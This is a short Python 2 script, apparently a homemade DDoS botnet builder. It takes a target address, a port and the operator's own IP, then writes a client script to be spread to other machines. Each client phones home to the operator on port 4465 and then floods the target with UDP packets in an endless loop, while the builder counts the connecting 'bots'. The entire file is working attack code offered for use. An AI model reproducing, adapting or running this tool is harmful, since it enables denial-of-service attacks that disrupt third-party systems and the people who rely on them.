#Original Program By Hic Adam/NSK B3
import sys, socket
help = """
Usage: python ddos_net.py [TARGET] [PORT] [LHOST]
-------------------------------------------|
                                           |
TARGET: Target IP ADDRESS/WEBSITE To Flood |
                                           |
PORT: Target PORT To Send the Packets to   |
                                           |
LHOST: Your Public IP Address              |
with port 4465 forwarded!                  |
___________________________________________|
"""
def cli():
	global target, port, lhost, LPORT
	try:
		target = sys.argv[1]
		port = sys.argv[2]
		lhost = sys.argv[3]
		LPORT = 4465
	except:
		print(help)
		quit()
cli()
code = """
import socket
class Client:
	def __init__(self, socket, signal):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.signal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	@classmethod
	def send_signal(self):
		self.signal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.signal.connect(('{0}', {1}))
		self.signal.close()
	@classmethod
	def send_attack(self, target):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		print('Loading.. This process might take 10-30 minutes!')
		while True:
			self.socket.sendto('request', ('{2}', {3}))
\n""".format(lhost, LPORT, target, port)

codesecond = """
def launch():
	Client.send_signal()
	Client.send_attack('%s')
launch()
""" % target
FULL_CODE = code + codesecond

def create_file():
	name = raw_input("Name Of The Client File: ")
	if '.py' not in name:
		print("The Client file must end with .py!")
		quit()
	f = open(name, "w")
	f.write(FULL_CODE)
	print "%s Created" % name
def listen():
	f = 0
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			conn.close()
		except:
			pass
		s.bind(("", LPORT))
		s.listen(100000)
		print "Started Listening..."
		try:
			conn, addr = s.accept()
		except:
			pass
		f += 1
		sys.stdout.write("\rBots Have Started Attacking!\n")
		sys.stdout.flush()

create_file()
listen()
